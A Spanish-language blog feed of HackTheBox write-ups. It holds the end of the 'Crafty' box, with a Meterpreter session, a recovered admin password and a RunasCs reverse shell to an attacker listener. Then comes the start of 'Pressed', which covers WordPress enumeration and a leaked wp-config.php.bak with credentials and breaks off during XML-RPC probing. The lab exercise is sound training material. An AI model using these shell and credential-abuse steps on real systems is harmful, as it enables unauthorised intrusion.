C:<span class="se">\U</span>sers<span class="se">\S</span>VC_MI~1<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp&gt;
</code></pre></div></div>

<ul>
  <li>Ahora lo ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\s</span>vc_minecraft<span class="se">\s</span>erver<span class="se">\p</span>lugins&gt;start %temp%/reverse.exe
start %temp%/reverse.exe
</code></pre></div></div>

<ul>
  <li>Y listo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> run

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.63:443
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>201798 bytes<span class="o">)</span> to 10.10.11.249
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.10.14.63:443 -&gt; 10.10.11.249:49708<span class="o">)</span> at 2024-06-25 17:43:58 <span class="nt">-0600</span>

meterpreter <span class="o">&gt;</span>
</code></pre></div></div>

<ul>
  <li>Ahora nos descargamos el <code class="language-plaintext highlighter-rouge">.jar</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> <span class="nb">pwd
</span>C:<span class="se">\U</span>sers<span class="se">\s</span>vc_minecraft<span class="se">\s</span>erver<span class="se">\p</span>lugins
meterpreter <span class="o">&gt;</span> download playercounter-1.0-SNAPSHOT.jar
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloading: playercounter-1.0-SNAPSHOT.jar -&gt; /home/miguel/playercounter-1.0-SNAPSHOT.jar
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloaded 9.76 KiB of 9.76 KiB <span class="o">(</span>100.0%<span class="o">)</span>: playercounter-1.0-SNAPSHOT.jar -&gt; /home/miguel/playercounter-1.0-SNAPSHOT.jar
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Completed  : playercounter-1.0-SNAPSHOT.jar -&gt; /home/miguel/playercounter-1.0-SNAPSHOT.jar
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a usar <code class="language-plaintext highlighter-rouge">jd-gui</code> para ver el archivo.</p>
  </li>
  <li>
    <p>Una vez lo subimos vemos que parase ser una contrase√±a.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/crafty/3.png" />
</p>

<ul>
  <li>
    <p>s67u84zKq8IXw.</p>
  </li>
  <li>
    <p>Lo mas probable es que la contrase√±a sea del usuario Administrador pero no vimos el puerto de <code class="language-plaintext highlighter-rouge">winrm</code> abierto as√≠ que vamos a tener que utilizar <code class="language-plaintext highlighter-rouge">RunasCs</code> para ganar acceso <a href="https://github.com/antonioCoco/RunasCs/releases">https://github.com/antonioCoco/RunasCs/releases</a>.</p>
  </li>
  <li>
    <p>Para pasar el Runas a la m√°quina victima podemos hacerlo sin necesidad de usar <code class="language-plaintext highlighter-rouge">Metasploit</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  Downloads impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span> <span class="nt">-username</span> <span class="nb">test</span> <span class="nt">-password</span> 1234567
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<ul>
  <li>Nos conectamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\u</span>sers<span class="se">\s</span>vc_minecraft<span class="se">\s</span>erver&gt;net use x: <span class="se">\\</span>10.10.14.63<span class="se">\s</span>mbFolder /user:test 1234567
net use x: <span class="se">\\</span>10.10.14.63<span class="se">\s</span>mbFolder /user:test 1234567
The <span class="nb">command </span>completed successfully.


c:<span class="se">\u</span>sers<span class="se">\s</span>vc_minecraft<span class="se">\s</span>erver&gt;
</code></pre></div></div>

<ul>
  <li>Y nos traemos el <code class="language-plaintext highlighter-rouge">RunasCs.exe</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\U</span>sers<span class="se">\s</span>vc_minecraft<span class="se">\D</span>ocuments&gt;copy x:<span class="se">\R</span>unasCs.exe <span class="nb">.</span>
copy x:<span class="se">\R</span>unasCs.exe <span class="nb">.</span>
        1 file<span class="o">(</span>s<span class="o">)</span> copied.

c:<span class="se">\U</span>sers<span class="se">\s</span>vc_minecraft<span class="se">\D</span>ocuments&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of c:<span class="se">\U</span>sers<span class="se">\s</span>vc_minecraft<span class="se">\D</span>ocuments

06/26/2024  12:00 PM    &lt;DIR&gt;          <span class="nb">.</span>
06/26/2024  12:00 PM    &lt;DIR&gt;          ..
05/19/2023  11:37 PM            51,712 RunasCs.exe
               1 File<span class="o">(</span>s<span class="o">)</span>         51,712 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   3,521,609,728 bytes free
</code></pre></div></div>

<ul>
  <li>Nos ponemos en escucha para recibir la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  Downloads rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\U</span>sers<span class="se">\s</span>vc_minecraft<span class="se">\D</span>ocuments&gt;.<span class="se">\R</span>unasCs.exe Administrator s67u84zKq8IXw cmd.exe <span class="nt">-r</span> 10.10.14.63:443
.<span class="se">\R</span>unasCs.exe Administrator s67u84zKq8IXw cmd.exe <span class="nt">-r</span> 10.10.14.63:443

<span class="o">[</span>+] Running <span class="k">in </span>session 1 with process <span class="k">function </span>CreateProcessWithLogonW<span class="o">()</span>
<span class="o">[</span>+] Using Station<span class="se">\D</span>esktop: WinSta0<span class="se">\D</span>efault
<span class="o">[</span>+] Async process <span class="s1">'C:\Windows\system32\cmd.exe'</span> with pid 1120 created <span class="k">in </span>background.
</code></pre></div></div>

<ul>
  <li>Recibimos la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  Downloads rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.63] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.249] 49683
Microsoft Windows <span class="o">[</span>Version 10.0.17763.5329]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
<span class="nb">whoami
</span>crafty<span class="se">\a</span>dministrator
</code></pre></div></div>

<h1 id="root-flag">root flag</h1>

<ul>
  <li>Vemos la ultima <code class="language-plaintext highlighter-rouge">flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;type C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
d34951e924b2aa7b46caeb3c3ab77fd0
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/easy" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Pressed (hard)</title><link href="http://localhost:4000/hackthebox/machines/hard/2024/06/24/pressed.html" rel="alternate" type="text/html" title="HackTheBox - Pressed (hard)" /><published>2024-06-24T00:00:00-06:00</published><updated>2024-06-24T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/hard/2024/06/24/pressed</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/hard/2024/06/24/pressed.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/933a05448c07bbdc08c3dcc1fe75aea6.png" />
</p>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span> 10.10.11.142 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-24 11:42 CST
Nmap scan report <span class="k">for </span>10.10.11.142
Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-title: UHC Jan Finals &amp;#8211<span class="p">;</span> New Month, New Boxes
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-generator: WordPress 5.9
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap <span class="nb">sudo </span>nmap <span class="nt">--script</span> http-enum <span class="nt">-p80</span> 10.10.11.142
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-24 11:46 CST
Nmap scan report <span class="k">for </span>10.10.11.142
Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2
|   /: WordPress version: 5.9
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
</code></pre></div></div>

<h2 id="enumeraci√≥n">Enumeraci√≥n</h2>

<ul>
  <li>
    <p>El escaneo de <strong>Nmap</strong> solo nos reporta 1 puerto abierto que esta corriendo un servicio <code class="language-plaintext highlighter-rouge">http</code> y esta usando un gestor de contenido que es <code class="language-plaintext highlighter-rouge">Wordpress</code>.</p>
  </li>
  <li>
    <p>Si investigamos la versi√≥n actual de <code class="language-plaintext highlighter-rouge">Wordpress</code> es la 6.5 <a href="https://www.nexcess.net/blog/wordpress-version/#:~:text=What%20is%20the%20WordPress%20current,site%20editor%20changes%2C%20and%20more.">https://www.nexcess.net/blog/wordpress-version/#:~:text=What%20is%20the%20WordPress%20current,site%20editor%20changes%2C%20and%20more.</a>.</p>
  </li>
  <li>
    <p>Esta es la pagina web.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/pressed/1.png" />
</p>

<ul>
  <li>Si damos click en el texto subrayado <code class="language-plaintext highlighter-rouge">UHC January Finals Under Way</code> se nos muestra lo siguiente.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/pressed/2.png" />
</p>

<ul>
  <li>Vamos agregar el subdominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para ver si cambia algo en la web.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap <span class="nb">sudo echo</span> <span class="s2">"10.10.11.142 pressed.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.142 pressed.htb
</code></pre></div></div>

<ul>
  <li>Pero vemos lo mismo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/pressed/3.png" />
</p>

<ul>
  <li>Vamos a llenar esa informaci√≥n para ver que es lo que pasa.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/pressed/4.png" />
</p>

<ul>
  <li>Bueno al principio no paso nada pero cuando volv√≠ a hacerlo me sali√≥ este mensaje.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/pressed/5.png" />
</p>

<ul>
  <li>Sabemos que existen las ruta t√≠picas de <code class="language-plaintext highlighter-rouge">WordPress</code> pero vamos a hacer <code class="language-plaintext highlighter-rouge">Fuzzing</code> para ver si encontramos otra ruta interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap dirsearch <span class="nt">-u</span> http://10.10.11.142
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 <span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/miguel/Hackthebox/Pressed/nmap/reports/http_10.10.11.142/_24-06-24_12-01-54.txt

Target: http://10.10.11.142/

<span class="o">[</span>12:01:54] Starting:
<span class="o">[</span>12:02:04] 403 -  277B  - /.ht_wsr.txt
<span class="o">[</span>12:02:05] 403 -  277B  - /.htaccess.sample
<span class="o">[</span>12:02:05] 403 -  277B  - /.htaccess_extra
<span class="o">[</span>12:02:05] 403 -  277B  - /.htaccess.orig
<span class="o">[</span>12:02:05] 403 -  277B  - /.htaccess_orig
<span class="o">[</span>12:02:05] 403 -  277B  - /.htaccess.save
<span class="o">[</span>12:02:05] 403 -  277B  - /.htaccessBAK
<span class="o">[</span>12:02:05] 403 -  277B  - /.htaccess.bak1
<span class="o">[</span>12:02:05] 403 -  277B  - /.htaccessOLD
<span class="o">[</span>12:02:05] 403 -  277B  - /.htaccessOLD2
<span class="o">[</span>12:02:05] 403 -  277B  - /.htaccess_sc
<span class="o">[</span>12:02:05] 403 -  277B  - /.httr-oauth
<span class="o">[</span>12:02:05] 403 -  277B  - /.html
<span class="o">[</span>12:02:05] 403 -  277B  - /.htm
<span class="o">[</span>12:02:05] 403 -  277B  - /.htpasswd_test
<span class="o">[</span>12:02:05] 403 -  277B  - /.htpasswds
<span class="o">[</span>12:02:11] 403 -  277B  - /.php
<span class="o">[</span>12:02:18] 200 -    4KB - /.wp-config.php.swp
<span class="o">[</span>12:04:18] 301 -    0B  - /index.php  -&gt;  http://10.10.11.142/
<span class="o">[</span>12:04:19] 404 -   21KB - /index.php/login/
<span class="o">[</span>12:04:29] 200 -    7KB - /license.txt
<span class="o">[</span>12:05:19] 200 -    3KB - /readme.html
<span class="o">[</span>12:05:26] 403 -  277B  - /server-status
</code></pre></div></div>

<ul>
  <li>
    <p>Vemos que en una ruta hay un archivo <code class="language-plaintext highlighter-rouge">.swp</code> <a href="https://filext.com/es/extension-de-archivo/SWP">https://filext.com/es/extension-de-archivo/SWP</a>.</p>
  </li>
  <li>
    <p>Si enumeramos con <code class="language-plaintext highlighter-rouge">wpscan</code> vemos que ya nos dice que el <code class="language-plaintext highlighter-rouge">XML-RPC</code> esta activado.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap wpscan <span class="nt">--url</span> http://10.10.11.142
_______________________________________________________________
         __          _______   _____
         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____|
          <span class="se">\ \ </span> /<span class="se">\ </span> / /| |__<span class="o">)</span> | <span class="o">(</span>___   ___  __ _ _ __ ¬Æ
           <span class="se">\ \/</span>  <span class="se">\/</span> / |  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __|/ _<span class="sb">`</span> | <span class="s1">'_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.11.142/ [10.10.11.142]
[+] Started: Mon Jun 24 12:40:59 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.11.142/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.11.142/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.11.142/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.11.142/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.9 identified (Insecure, released on 2022-01-25).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.11.142/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.9&lt;/generator&gt;
 |  - http://10.10.11.142/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.9&lt;/generator&gt;

[+] WordPress theme in use: retrogeek
 | Location: http://10.10.11.142/wp-content/themes/retrogeek/
 | Last Updated: 2024-04-26T00:00:00.000Z
 | Readme: http://10.10.11.142/wp-content/themes/retrogeek/README.txt
 | [!] The version is out of date, the latest version is 0.7
 | Style URL: http://10.10.11.142/wp-content/themes/retrogeek/style.css?ver=42
 | Style Name: RetroGeek
 | Style URI: https://tuxlog.de/retrogeek/
 | Description: A lightweight, minimal, fast and geeky retro theme remembering the good old terminal times...
 | Author: tuxlog
 | Author URI: https://tuxlog.de/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 0.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.11.142/wp-content/themes/retrogeek/style.css?ver=42, Match: '</span>Version: 0.5<span class="s1">'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:04 &lt;=====================================================&gt; (137 / 137) 100.00% Time: 00:00:04

[i] Config Backup(s) Identified:

[!] http://10.10.11.142/wp-config.php.bak
 | Found By: Direct Access (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jun 24 12:41:23 2024
[+] Requests Done: 173
[+] Cached Requests: 5
[+] Data Sent: 44.019 KB
[+] Data Received: 126.531 KB
[+] Memory used: 253.621 MB
[+] Elapsed time: 00:00:23
</span></code></pre></div></div>

<ul>
  <li>Vemos un <code class="language-plaintext highlighter-rouge">wp-config.php.bak</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap wget http://10.10.11.142/wp-config.php.bak
<span class="nt">--2024-06-24</span> 12:42:38--  http://10.10.11.142/wp-config.php.bak
Connecting to 10.10.11.142:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3194 <span class="o">(</span>3.1K<span class="o">)</span> <span class="o">[</span>application/x-trash]
Saving to: ‚Äòwp-config.php.bak‚Äô

wp-config.php.bak                100%[<span class="o">==========================================================&gt;]</span>   3.12K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.005s

2024-06-24 12:42:38 <span class="o">(</span>638 KB/s<span class="o">)</span> - ‚Äòwp-config.php.bak‚Äô saved <span class="o">[</span>3194/3194]
</code></pre></div></div>

<ul>
  <li>Vemos credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap <span class="nb">cat </span>wp-config.php.bak
&lt;?php
/<span class="k">**</span>
 <span class="k">*</span> The base configuration <span class="k">for </span>WordPress
 <span class="k">*</span>
 <span class="k">*</span> The wp-config.php creation script uses this file during the installation.
 <span class="k">*</span> You don<span class="s1">'t have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( '</span>DB_NAME<span class="s1">', '</span>wordpress<span class="s1">' );

/** Database username */
define( '</span>DB_USER<span class="s1">', '</span>admin<span class="s1">' );

/** Database password */
define( '</span>DB_PASSWORD<span class="s1">', '</span>uhc-jan-finals-2021<span class="s1">' );

/** Database hostname */
define( '</span>DB_HOST<span class="s1">', '</span>localhost<span class="s1">' );

/** Database charset to use in creating database tables. */
define( '</span>DB_CHARSET<span class="s1">', '</span>utf8mb4<span class="s1">' );

/** The database collate type. Don'</span>t change this <span class="k">if in </span>doubt. <span class="k">*</span>/
define<span class="o">(</span> <span class="s1">'DB_COLLATE'</span>, <span class="s1">''</span> <span class="o">)</span><span class="p">;</span>

/<span class="k">**</span><span class="c">#@+</span>
 <span class="k">*</span> Authentication unique keys and salts.
 <span class="k">*</span>
 <span class="k">*</span> Change these to different unique phrases! You can generate these using
 <span class="k">*</span> the <span class="o">{</span>@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service<span class="o">}</span><span class="nb">.</span>
 <span class="k">*</span>
 <span class="k">*</span> You can change these at any point <span class="k">in </span><span class="nb">time </span>to invalidate all existing cookies.
 <span class="k">*</span> This will force all <span class="nb">users </span>to have to log <span class="k">in </span>again.
 <span class="k">*</span>
 <span class="k">*</span> @since 2.6.0
 <span class="k">*</span>/
define<span class="o">(</span> <span class="s1">'AUTH_KEY'</span>,         <span class="s1">'3MYXll40,8gfj_jX4!3J(278f1(SGEZ+v]#w]Bu&lt;PrstLLHEZig,MJB#t E2pU2t'</span> <span class="o">)</span><span class="p">;</span>
define<span class="o">(</span> <span class="s1">'SECURE_AUTH_KEY'</span>,  <span class="s1">'QPkQ%%h&amp;5$3$C;Z}2N!LKz.O 57i2U.582Gy{C=$XV_(jJz~3gC=*nKP//{v{?n&lt;'</span> <span class="o">)</span><span class="p">;</span>
define<span class="o">(</span> <span class="s1">'LOGGED_IN_KEY'</span>,    <span class="s1">'rp}RE/3-_3OF%./6PH` 1zbCy#H22NRH,ETR(c2*Qlu&amp;W&gt;lW|::4T[iFx%W|%[hA'</span> <span class="o">)</span><span class="p">;</span>
define<span class="o">(</span> <span class="s1">'NONCE_KEY'</span>,        <span class="s1">'#%s&amp;zIE/mSuvN{+2]^n;21]|u;gmP6!-ihyCn91j{/.KRGbg8}{3C%kZ#$(i&amp;bc-'</span> <span class="o">)</span><span class="p">;</span>
define<span class="o">(</span> <span class="s1">'AUTH_SALT'</span>,        <span class="s1">',7BVMi:h`][Q/3j8tHN*EjKk,jY|+hm.3OnjYS A$ArIx7B z]WzLJ$Tc7&lt;/s`td'</span> <span class="o">)</span><span class="p">;</span>
define<span class="o">(</span> <span class="s1">'SECURE_AUTH_SALT'</span>, <span class="s1">']s_RJ,%OLa.}_8wP Qeu9WJUhJ2Zd2I%&gt;T5R#f{8op9:Hn??}7{ZJ*.K.t/{lVl0'</span> <span class="o">)</span><span class="p">;</span>
define<span class="o">(</span> <span class="s1">'LOGGED_IN_SALT'</span>,   <span class="s1">'wwQj(p&amp;1I8zAK!2lhR[xg.Vt`qeh|2R}HMz?~TuQ9QE*@iy?@*?pDV;[4BL9*n#W'</span> <span class="o">)</span><span class="p">;</span>
define<span class="o">(</span> <span class="s1">'NONCE_SALT'</span>,       <span class="s1">'[Wv%%EDN&lt;b/a_&lt;/u|snqMQ q)xPW8GyB4WAw f+1k2|IFbu*7#U(g-# l{Kw n6Z'</span> <span class="o">)</span><span class="p">;</span>

/<span class="k">**</span><span class="c">#@-*/</span>

/<span class="k">**</span>
 <span class="k">*</span> WordPress database table prefix.
 <span class="k">*</span>
 <span class="k">*</span> You can have multiple installations <span class="k">in </span>one database <span class="k">if </span>you give each
 <span class="k">*</span> a unique prefix. Only numbers, letters, and underscores please!
 <span class="k">*</span>/
<span class="nv">$table_prefix</span> <span class="o">=</span> <span class="s1">'wp_'</span><span class="p">;</span>

/<span class="k">**</span>
 <span class="k">*</span> For developers: WordPress debugging mode.
 <span class="k">*</span>
 <span class="k">*</span> Change this to <span class="nb">true </span>to <span class="nb">enable </span>the display of notices during development.
 <span class="k">*</span> It is strongly recommended that plugin and theme developers use WP_DEBUG
 <span class="k">*</span> <span class="k">in </span>their development environments.
 <span class="k">*</span>
 <span class="k">*</span> For information on other constants that can be used <span class="k">for </span>debugging,
 <span class="k">*</span> visit the documentation.
 <span class="k">*</span>
 <span class="k">*</span> @link https://wordpress.org/support/article/debugging-in-wordpress/
 <span class="k">*</span>/
define<span class="o">(</span> <span class="s1">'WP_DEBUG'</span>, <span class="nb">false</span> <span class="o">)</span><span class="p">;</span>

/<span class="k">*</span> Add any custom values between this line and the <span class="s2">"stop editing"</span> line. <span class="k">*</span>/



/<span class="k">*</span> That<span class="s1">'s all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( '</span>ABSPATH<span class="s1">' ) ) {
	define( '</span>ABSPATH<span class="s1">', __DIR__ . '</span>/<span class="s1">' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . '</span>wp-settings.php<span class="s1">';
</span></code></pre></div></div>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">admin:uhc-jan-finals-2021</code></p>
  </li>
  <li>
    <p>Si probamos las credenciales vemos que son incorrectas.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/pressed/xd.png" />
</p>

<ul>
  <li>Si cambiamos de 2021 a 2022 nos muestra esto.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/pressed/zi.png" />
</p>

<ul>
  <li>
    <p>Con esto sabemos que la credencial es valida.</p>
  </li>
  <li>
    <p>Podemos enumerar mediante este script <code class="language-plaintext highlighter-rouge">php</code> <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#xml-rpc">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#xml-rpc</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.10.11.142/xmlrpc.php
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
&lt;methodResponse&gt;
  &lt;fault&gt;
    &lt;value&gt;
      &lt;struct&gt;
        &lt;member&gt;
          &lt;name&gt;faultCode&lt;/name&gt;
          &lt;value&gt;&lt;int&gt;-32700&lt;/int&gt;&lt;/value&gt;
        &lt;/member&gt;
        &lt;member&gt;
          &lt;name&gt;faultString&lt;/name&gt;
          &lt;value&gt;&lt;string&gt;parse error. not well formed&lt;/string&gt;&lt;/value&gt;
        &lt;/member&gt;
      &lt;/struct&gt;
    &lt;/value&gt;
  &lt;/fault&gt;
&lt;/methodResponse&gt;
</code></pre></div></div>

<ul>
  <li>Hay una ruta llamada <code class="language-plaintext highlighter-rouge">/uploads</code> pero no hay nada.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/pressed/6.png" />
</p>

<ul>
  <li>
    <p><a href="https://www.hostinger.mx/tutoriales/que-es-xmlrpc-php-wordpress-por-que-desactivarlo/">https://www.hostinger.mx/tutoriales/que-es-xmlrpc-php-wordpress-por-que-desactivarlo/</a>.</p>
  </li>
  <li>
    <p>Vamos a ver si esta activo.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap curl <span class="nt">-X</span> POST <span class="nt">--data</span> <span class="s2">"&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt;"</span> http://10.10.11.142/xmlrpc.php
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
&lt;methodResponse&gt;
  &lt;params&gt;
